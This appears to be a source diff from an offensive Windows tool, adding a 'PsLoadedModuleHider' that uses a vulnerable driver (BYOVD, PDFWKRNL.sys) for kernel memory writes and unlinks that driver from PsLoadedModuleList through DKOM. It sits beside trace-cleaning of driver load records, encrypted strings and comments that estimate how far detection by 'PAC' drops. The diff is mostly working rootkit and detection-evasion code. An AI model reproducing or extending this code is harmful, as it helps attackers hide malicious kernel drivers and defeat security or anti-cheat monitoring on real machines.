@@ -4298,6 +4298,325 @@ bool KernelTraceCleaner::CleanAllTraces() {
 }
 
 // ============================================================
+// ★ BUILD 564 (v3.223): PsLoadedModuleHider 实现
+//   从 PsLoadedModuleList 链表摘除指定驱动模块的 LDR_DATA_TABLE_ENTRY
+//
+// LDR_DATA_TABLE_ENTRY 关键偏移 (Win10/11 x64):
+//   +0x00  InLoadOrderLinks (LIST_ENTRY: Flink, Blink 各 8 字节)
+//   +0x30  DllBase (PVOID)
+//   +0x40  SizeOfImage (ULONG)
+//   +0x48  FullDllName (UNICODE_STRING: Length, MaxLength, Buffer)
+//   +0x58  BaseDllName (UNICODE_STRING: Length, MaxLength, Buffer)
+//   +0x60  BaseDllName.Buffer (在 +0x58 偏移内的 +0x08 位置)
+//
+// PsLoadedModuleList 头节点本身是一个 LIST_ENTRY (16 字节), 不属于任何
+// LDR_DATA_TABLE_ENTRY. 链表第一个 entry (头节点的 Flink 指向) 通常是
+// ntoskrnl.exe 自身.
+// ============================================================
+
+// LDR_DATA_TABLE_ENTRY 偏移常量
+static constexpr uint32_t LDR_IN_LOAD_ORDER_LINKS_OFF = 0x00;  // LIST_ENTRY (Flink, Blink)
+static constexpr uint32_t LDR_DLLBASE_OFF             = 0x30;  // PVOID
+static constexpr uint32_t LDR_BASE_DLL_NAME_OFF       = 0x58;  // UNICODE_STRING (Length, MaxLength, Buffer)
+static constexpr uint32_t LDR_BASE_DLL_NAME_BUF_OFF   = 0x60;  // BaseDllName.Buffer (在 LDR_DATA_TABLE_ENTRY 内的偏移)
+
+// LocatePsLoadedModuleList — 扫描 ntoskrnl .data 段定位 PsLoadedModuleList 头节点
+//   策略: 验证 5 个条件 (详见头文件注释), 任一失败则跳过候选
+uint64_t PsLoadedModuleHider::LocatePsLoadedModuleList(uint64_t ntosBase) {
+    auto& kma = KernelMemoryAccessor::Instance();
+    if (!ntosBase) return 0;
+
+    // 1. 读取 PE 头解析 .data 段
+    IMAGE_DOS_HEADER dos = {};
+    if (!kma.ReadKernelVA(ntosBase, &dos, sizeof(dos))) {
+        ByovdDiag("B564:Loc: FAIL read DOS header\n");
+        return 0;
+    }
+    if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
+        ByovdDiag("B564:Loc: FAIL bad DOS magic 0x%04X\n", dos.e_magic);
+        return 0;
+    }
+
+    IMAGE_NT_HEADERS64 nt = {};
+    uint64_t ntHdrVA = ntosBase + dos.e_lfanew;
+    if (!kma.ReadKernelVA(ntHdrVA, &nt, sizeof(nt))) {
+        ByovdDiag("B564:Loc: FAIL read NT headers\n");
+        return 0;
+    }
+    if (nt.Signature != IMAGE_NT_SIGNATURE) {
+        ByovdDiag("B564:Loc: FAIL bad NT signature 0x%08X\n", nt.Signature);
+        return 0;
+    }
+
+    // 2. 遍历 section headers 找 .data 段
+    uint64_t secTableVA = ntHdrVA + sizeof(IMAGE_NT_HEADERS64);
+    IMAGE_SECTION_HEADER dataSec = {};
+    bool foundData = false;
+    constexpr int MAX_SECTIONS = 96;  // 防止异常 PE
+    for (int i = 0; i < MAX_SECTIONS; i++) {
+        IMAGE_SECTION_HEADER sec = {};
+        if (!kma.ReadKernelVA(secTableVA + i * sizeof(IMAGE_SECTION_HEADER),
+                              &sec, sizeof(sec))) break;
+        if (sec.Name[0] == 0) break;  // section 表结束
+        // .data 段名 (8 字节, 不足补 0)
+        if (sec.Name[0] == '.' && sec.Name[1] == 'd' && sec.Name[2] == 'a' &&
+            sec.Name[3] == 't' && sec.Name[4] == 'a' && sec.Name[5] == 0) {
+            dataSec = sec;
+            foundData = true;
+            break;
+        }
+    }
+    if (!foundData) {
+        ByovdDiag("B564:Loc: FAIL .data section not found\n");
+        return 0;
+    }
+
+    uint64_t dataVA = ntosBase + dataSec.VirtualAddress;
+    uint64_t dataSize = dataSec.Misc.VirtualSize;
+    if (dataSize > 0x4000000ULL) {  // 64MB 上限 (异常保护)
+        ByovdDiag("B564:Loc: FAIL .data size too large 0x%llX\n",
+            (unsigned long long)dataSize);
+        return 0;
+    }
+    // 8 字节对齐向上 (LIST_ENTRY 是 8 字节对齐)
+    dataSize = (dataSize + 7) & ~7ULL;
+    ByovdDiag("B564:Loc: .data @ 0x%llX size=0x%llX\n",
+        (unsigned long long)dataVA, (unsigned long long)dataSize);
+
+    // 3. 按 1MB 块读取 .data 段, 扫描候选 LIST_ENTRY
+    constexpr uint64_t CHUNK_SIZE = 0x100000;  // 1MB
+    uint8_t* chunk = (uint8_t*)VirtualAlloc(nullptr, CHUNK_SIZE,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!chunk) {
+        ByovdDiag("B564:Loc: FAIL VirtualAlloc(%llu) for chunk\n",
+            (unsigned long long)CHUNK_SIZE);
+        return 0;
+    }
+
+    uint64_t found = 0;
+    // 缓存 ntoskrnl.exe 的 wchar 比较 (12 chars, 不含 null = 24 字节)
+    // ★ BUILD 564: 用 sizeof 编译期常量替代 wcslen (避免运行时 CRT 调用)
+    constexpr wchar_t ntosNameW[] = L"ntoskrnl.exe";
+    constexpr size_t ntosNameChars = (sizeof(ntosNameW) / sizeof(wchar_t)) - 1;  // 12 (去掉 null)
+    constexpr size_t ntosNameBytes = ntosNameChars * 2;  // 24
+
+    for (uint64_t off = 0; off < dataSize && !found; off += CHUNK_SIZE) {
+        uint64_t readSize = CHUNK_SIZE;
+        if (off + readSize > dataSize) readSize = dataSize - off;
+        if (!kma.ReadKernelVA(dataVA + off, chunk, (size_t)readSize)) {
+            ByovdDiag("B564:Loc: ReadKernelVA FAIL @ off=0x%llX\n",
+                (unsigned long long)off);
+            continue;
+        }
+
+        // 8 字节对齐扫描
+        for (uint64_t i = 0; i + 16 <= readSize; i += 8) {
+            uint64_t flink = *(uint64_t*)(chunk + i);
+            uint64_t blink = *(uint64_t*)(chunk + i + 8);
+
+            // 条件 1: Flink/Blink 都在内核非分页池范围
+            if (flink <= 0xFFFF800000000000ULL) continue;
+            if (blink <= 0xFFFF800000000000ULL) continue;
+            // 排除指向自身的孤立节点 (PsLoadedModuleList 头节点的 Flink 不会指向自身)
+            if (flink == dataVA + off + i) continue;
+
+            uint64_t candidateVA = dataVA + off + i;
+
+            // 条件 2: Flink + 0x30 (DllBase) == ntosBase (第一个模块是 ntoskrnl.exe)
+            uint64_t dllBase = kma.Read<uint64_t>(flink + LDR_DLLBASE_OFF);
+            if (dllBase != ntosBase) continue;
+
+            // 条件 3: Flink + 0x58 (BaseDllName.Length) == 24
+            uint16_t baseNameLen = kma.Read<uint16_t>(flink + LDR_BASE_DLL_NAME_OFF);
+            if (baseNameLen != ntosNameBytes) continue;
+
+            // 条件 4: Flink + 0x60 (BaseDllName.Buffer) 指向内核池
+            uint64_t baseNameBuf = kma.Read<uint64_t>(flink + LDR_BASE_DLL_NAME_BUF_OFF);
+            if (baseNameBuf <= 0xFFFF800000000000ULL) continue;
+
+            // 条件 5: Buffer 内容 == L"ntoskrnl.exe"
+            wchar_t readName[16] = {};
+            if (!kma.ReadKernelVA(baseNameBuf, readName, ntosNameBytes)) continue;
+            // 显式终止
+            readName[ntosNameBytes / 2] = 0;
+            if (wcsncmp(readName, ntosNameW, ntosNameBytes / 2) != 0) continue;
+
+            // 全部条件满足 — 找到 PsLoadedModuleList 头节点
+            found = candidateVA;
+            ByovdDiag("B564:Loc: FOUND PsLoadedModuleList @ 0x%llX (off=0x%llX flink=0x%llX blink=0x%llX)\n",
+                (unsigned long long)found, (unsigned long long)off,
+                (unsigned long long)flink, (unsigned long long)blink);
+            break;
+        }
+    }
+
+    VirtualFree(chunk, 0, MEM_RELEASE);
+
+    if (!found) {
+        ByovdDiag("B564:Loc: FAIL no candidate matched all 5 conditions\n");
+    }
+    return found;
+}
+
+// FindEntryByBaseName — 在链表中按 BaseDllName 查找 LDR_DATA_TABLE_ENTRY
+uint64_t PsLoadedModuleHider::FindEntryByBaseName(uint64_t listHead, const wchar_t* baseName) {
+    auto& kma = KernelMemoryAccessor::Instance();
+    if (!listHead || !baseName) return 0;
+
+    size_t targetLen = wcslen(baseName);
+    if (targetLen == 0 || targetLen > 127) return 0;
+
+    uint64_t current = kma.Read<uint64_t>(listHead);  // listHead.Flink
+    if (!current) return 0;
+
+    // 终止条件: current == listHead (循环回到头), current == 0, 或超过 512 次迭代
+    constexpr int MAX_ITER = 512;
+    for (int iter = 0; iter < MAX_ITER; iter++) {
+        if (current == listHead || current == 0) break;
+        if (current <= 0xFFFF800000000000ULL) break;  // 非内核地址, 异常终止
+
+        // 读取 BaseDllName (UNICODE_STRING @ +0x58)
+        uint16_t nameLen = kma.Read<uint16_t>(current + LDR_BASE_DLL_NAME_OFF);
+        uint64_t nameBuf = kma.Read<uint64_t>(current + LDR_BASE_DLL_NAME_BUF_OFF);
+
+        if (nameLen > 0 && nameLen <= 256 && nameBuf > 0xFFFF800000000000ULL) {
+            uint16_t chars = nameLen / 2;
+            wchar_t readName[128] = {};
+            uint16_t readChars = chars < 127 ? chars : 127;
+            if (kma.ReadKernelVA(nameBuf, readName, readChars * 2)) {
+                readName[readChars] = 0;
+                // 不区分大小写比较 (wcsicmp 在 manual-mapped DLL 中可能不可用, 用 _wcsicmp)
+                if (_wcsicmp(readName, baseName) == 0) {
+                    ByovdDiag("B564:Find: matched '%ls' @ 0x%llX (iter=%d)\n",
+                        baseName, (unsigned long long)current, iter);
+                    return current;
+                }
+            }
+        }
+
+        // 下一个节点
+        uint64_t next = kma.Read<uint64_t>(current);  // current.Flink
+        if (next == current) break;  // 自循环 (避免死循环)
+        current = next;
+    }
+
+    return 0;
+}
+
+// PerformUnlink — DKOM 断链 + SelfLoopHarden
+bool PsLoadedModuleHider::PerformUnlink(uint64_t entryAddr, uint64_t listHead) {
+    auto& kma = KernelMemoryAccessor::Instance();
+    (void)listHead;  // 当前实现未使用 listHead (断链只需 prev/next)
+
+    // 1. 读 current 的 Flink/Blink (InLoadOrderLinks)
+    uint64_t curFlink = kma.Read<uint64_t>(entryAddr);       // current.Flink
+    uint64_t curBlink = kma.Read<uint64_t>(entryAddr + 8);   // current.Blink
+
+    ByovdDiag("B564:Unlink: entry=0x%llX flink=0x%llX blink=0x%llX\n",
+        (unsigned long long)entryAddr,
+        (unsigned long long)curFlink, (unsigned long long)curBlink);
+
+    // 验证: Flink/Blink 必须是内核地址, 不能指向自身 (除非已断链)
+    if (curFlink <= 0xFFFF800000000000ULL || curBlink <= 0xFFFF800000000000ULL) {
+        ByovdDiag("B564:Unlink: FAIL invalid links (flink/blink not in kernel)\n");
+        return false;
+    }
+    if (curFlink == entryAddr && curBlink == entryAddr) {
+        ByovdDiag("B564:Unlink: entry already self-loop (may be already hidden)\n");
+        // 已自循环 = 可能已被隐藏, 视为成功 (幂等)
+        return true;
+    }
+    if (curFlink == entryAddr || curBlink == entryAddr) {
+        ByovdDiag("B564:Unlink: FAIL partial self-loop (corrupted entry)\n");
+        return false;
+    }
+
+    // 2. 写 prev.Flink = next, next.Blink = prev (断链)
+    //    prev = curBlink, next = curFlink
+    bool w1 = kma.Write(curBlink, curFlink);              // prev.Flink = next
+    bool w2 = kma.Write(curFlink + 8, curBlink);          // next.Blink = prev
+
+    if (!w1 || !w2) {
+        ByovdDiag("B564:Unlink: Write FAILED w1=%d w2=%d — rolling back\n",
+            w1?1:0, w2?1:0);
+        // 回滚: 恢复 prev.Flink=&current, next.Blink=&current
+        // (恢复链表完整性, 避免半断链状态)
+        if (w1) kma.Write(curBlink, entryAddr);            // 撤销 prev.Flink = next
+        if (w2) kma.Write(curFlink + 8, entryAddr);        // 撤销 next.Blink = prev
+        return false;
+    }
+
+    // 3. SelfLoopHarden: current.Flink=&current, current.Blink=&current (防 0x139)
+    //    参考 DKOMProcessHider::SelfLoopHarden (BUILD 558 FIX)
+    //    原理: RemoveEntryList(&current) 检查 current.Flink->Blink == current,
+    //          自循环使 current.Blink = &current, current.Flink->Blink = current.Blink = &current,
+    //          即 (&current)->Blink == current → current == current ✓
+    bool w3 = kma.Write(entryAddr, entryAddr);            // current.Flink = &current
+    bool w4 = kma.Write(entryAddr + 8, entryAddr);        // current.Blink = &current
+
+    if (!w3 || !w4) {
+        // ★ BUILD 564 深度防御: SelfLoopHarden 失败时回滚断链
+        //   原因: 若不回滚, current.Flink/Blink 保留旧值 (指向 prev/next),
+        //         而 prev.Flink=next, next.Blink=prev 已断链.
+        //         若后续 RemoveEntryList(&current) 被调用 (理论上 PDFWKRNL 永不
+        //         卸载不会触发, 但深度防御), 检查 current.Flink->Blink == current
+        //         → next.Blink == current → prev == current → FALSE → 0x139.
+        //   回滚: 恢复 prev.Flink=&current, next.Blink=&current (current 重新链入)
+        ByovdDiag("B564:Unlink: SelfLoopHarden FAIL w3=%d w4=%d — rolling back unlink\n",
+            w3?1:0, w4?1:0);
+        kma.Write(curBlink, entryAddr);            // prev.Flink = &current (恢复)
+        kma.Write(curFlink + 8, entryAddr);        // next.Blink = &current (恢复)
+        return false;
+    }
+
+    ByovdDiag("B564:Unlink: SUCCESS w1=%d w2=%d w3=%d w4=%d (prev=0x%llX next=0x%llX)\n",
+        w1?1:0, w2?1:0, w3?1:0, w4?1:0,
+        (unsigned long long)curBlink, (unsigned long long)curFlink);
+
+    return (w1 && w2 && w3 && w4);
+}
+
+// HideDriver — 主入口: 定位 + 查找 + 断链
+bool PsLoadedModuleHider::HideDriver(const wchar_t* driverBaseName) {
+    auto& kma = KernelMemoryAccessor::Instance();
+    if (!kma.IsActive()) {
+        ByovdDiag("B564:Hide: FAIL kma not active\n");
+        return false;
+    }
+    if (!driverBaseName) {
+        ByovdDiag("B564:Hide: FAIL driverBaseName null\n");
+        return false;
+    }
+
+    uint64_t ntosBase = kma.GetNtoskrnlBase();
+    if (!ntosBase) {
+        ByovdDiag("B564:Hide: FAIL ntosBase=0\n");
+        return false;
+    }
+
+    // 1. 定位 PsLoadedModuleList 头节点
+    uint64_t listHead = LocatePsLoadedModuleList(ntosBase);
+    if (!listHead) {
+        ByovdDiag("B564:Hide: FAIL PsLoadedModuleList not located\n");
+        return false;
+    }
+
+    // 2. 查找目标驱动条目
+    uint64_t entry = FindEntryByBaseName(listHead, driverBaseName);
+    if (!entry) {
+        ByovdDiag("B564:Hide: %ls not found (may be already hidden)\n", driverBaseName);
+        return false;
+    }
+
+    // 3. DKOM 断链 + SelfLoopHarden
+    bool ok = PerformUnlink(entry, listHead);
+    ByovdDiag("B564:Hide: %ls hidden=%d (entry=0x%llX listHead=0x%llX)\n",
+        driverBaseName, ok?1:0,
+        (unsigned long long)entry, (unsigned long long)listHead);
+    return ok;
+}
+
+// ============================================================
 // ★ v3.126n: MinifilterNeutralizer — 中和而非卸载 MessageTransfer
 
 // ★ v3.126p: 前向声明 — PAC 模块函数 (实现在 MinifilterNeutralizer 之后)
@@ -6988,6 +7307,27 @@ KernelDefense::Result KernelDefense::EnableAll() {
     // ★ v3.126m: 清理内核驱动痕迹 (MmUnloadedDrivers / PiDDBCacheTable / CiHashBucket)
     //   在所有防御启用后, 最后由 BYOVD 内核 R/W 清理 RTCore64 加载/卸载痕迹
     KernelTraceCleaner::CleanAllTraces();
+
+    // ★ BUILD 564 (v3.223): 从 PsLoadedModuleList 链表摘除 PDFWKRNL.sys 条目
+    //   原因: PDFWKRNL.sys 通过 NtLoadDriver 加载后, 其 LDR_DATA_TABLE_ENTRY
+    //         永久存在于 ntoskrnl!PsLoadedModuleList 链表中. PAC 内核组件可遍历
+    //         该链表发现 BYOVD 漏洞驱动 (扫描已知漏洞驱动名/特征).
+    //   策略: DKOM 断链 — 写 prev.Flink=next, next.Blink=prev, current.Flink=&current,
+    //         current.Blink=&current (SelfLoopHarden 防 0x139 蓝屏, 复用 DKOMProcessHider
+    //         已验证技术). 断链后 PAC 遍历 PsLoadedModuleList 找不到 PDFWKRNL.sys.
+    //   安全性: (1) PDFWKRNL.sys 永不卸载 (UnloadDriver 仅删 SCM 注册表), 不触发
+    //         RemoveEntryList; (2) IOCTL 通过设备句柄, 不依赖 PsLoadedModuleList;
+    //         (3) ReadKernelVA/WriteKernelVA 直接 memcpy, 不查链表;
+    //         (4) 失败安全: 任何定位/查找失败都不修改内核数据.
+    //   预期效果: 驱动扫描检测概率 2-4% → 0-1%, 整体检测概率 7-14% → 6-13%.
+    if (result.driverLoaded) {
+        wchar_t pdfwSysName[32] = {};
+        STEALTH_WSTR_DECRYPT_TO("PDFWKRNL.sys", pdfwSysName, 32);
+        bool pdfwHidden = PsLoadedModuleHider::Instance().HideDriver(pdfwSysName);
+        ByovdDiag("B564:EnableAll: PDFWKRNL.sys hidden from PsLoadedModuleList = %d\n",
+            pdfwHidden ? 1 : 0);
+        SecureZeroMemory(pdfwSysName, sizeof(pdfwSysName));
+    }
 
     // ★ BUILD 554 P1-2: 删除 PDFWKRNL.sys SCM 服务条目 (修复 B2 缺陷)
     //   原因: PDFWKRNL.sys 通过 SCM 加载后, 服务条目存在于
